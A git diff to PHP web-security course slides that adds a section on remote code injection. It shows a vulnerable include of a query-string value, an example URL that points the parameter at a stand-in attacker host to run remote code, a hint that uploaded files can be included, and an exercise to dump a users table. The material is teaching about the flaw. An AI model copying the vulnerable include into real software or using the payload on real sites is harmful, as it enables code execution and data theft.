@@ -3,7 +3,7 @@
 
 *Pre-requisites: lesson 4*
 
-*ECV Digital - 05/11/2015*
+*ECV Digital - 12/11/2015*
 
 ---
 # Security
@@ -228,6 +228,41 @@ There is an **evil `eval()`** function behind those statements
 ```
 
 --
+## Remote code injection
+A **Remote Code Injection (RCI)** attack occurs when an attacker is able to cause your application to execute PHP code of his choosing.
+
+For example, you could use query string variables such as: `http://example.org/?section=news` to structure the application into sections.
+
+Behind the scene, we will find something like:
+```php
+<?php
+include "{$_GET['section']}/index.inc.php";
+?>
+```
+--
+# RCI
+The previous code is very vulnerable. One could write: 
+```
+http://example.org/?section=http%3A%2F%2Fevil.example.org%2Fattack.inc%3F
+```
+The application will include attack.inc, located on the remote server, which treats /data.inc.php as part of the query string, thus effectively neutralizing its effect within your script.
+
+> Any PHP code contained in attack.inc is executed
+
+--
+# RCI
+Most of the time, the PHP configuration forbid remote file inclusion.
+
+Safe, you think ?
+
+If somewhere in the application, you can upload a file (an image for example), one could trick the upload system to upload a PHP script and then call it from the inside thanks to an include statement ...
+
+--
+# Exercice
+- Analyse the file rci-example.php in the exercice folder
+- Create a RCI that dumps all the users table
+
+---
 # Exercice
 - Create multiple files and require them at the right place in your code and DRY your code!
   - session.php / header.php / footer.php
@@ -237,4 +272,4 @@ There is an **evil `eval()`** function behind those statements
   - String
     - Create DB/input sanitize functions
 - Use Exceptions to improve error handling
-- Refactor all our code!
+- Refactor all your code!
